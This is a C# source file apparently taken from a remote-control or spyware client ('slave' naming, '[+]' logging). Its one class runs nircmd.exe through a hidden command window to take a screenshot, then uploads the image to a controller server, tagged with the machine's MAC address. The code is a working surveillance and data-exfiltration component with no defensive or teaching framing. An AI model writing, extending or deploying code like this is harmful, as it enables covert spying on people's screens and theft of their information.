using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Reflection;


namespace TestAPP.lib
{
    public class ScreenshotUtil
    {
        public static void CaptureMyScreen(String macAddress)
        {
            String currentWorkingDirectory = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            String outputFileName = currentWorkingDirectory + "\\screenshot.png";
            String url = Constants.API_SLAVE_SCREENSHOT_RESPONSE_URL + "?mac=" + macAddress;

            Console.WriteLine("[+] Calling CaptureMyScreen");
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/C "+ currentWorkingDirectory + "\\nircmd.exe savescreenshot "+ outputFileName;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardInput = true;
            process.Start();
            string output = "";
            while (!process.HasExited)
            {
                output += process.StandardOutput.ReadToEnd();
            }
            Console.WriteLine("Screenshot output is " + outputFileName);
            Console.WriteLine("URL is "+ url);

            HTTPWebClient.sendFileToServer(url, outputFileName);
        }
    }
}
